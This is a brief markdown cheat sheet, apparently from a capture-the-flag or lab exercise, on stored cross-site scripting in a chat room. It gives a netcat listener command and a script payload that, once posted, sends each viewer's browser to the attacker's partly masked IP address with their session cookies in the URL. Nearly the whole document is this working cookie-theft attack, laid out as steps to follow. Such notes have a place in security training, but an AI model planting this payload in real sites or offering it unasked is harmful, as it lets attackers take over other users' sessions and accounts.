# XSS 
## Stored XX
### Chat Room XSS
- Start a netcat listener on your attack box
````
nc -nlvp 4444
````
- Take this XSS payload and paste it in the chat room and submit:
````
<script>window.location='http://10.13.**.**:4444/?cookie='+document.cookie</script>
````
- Note: Send the payload and then open the listener 
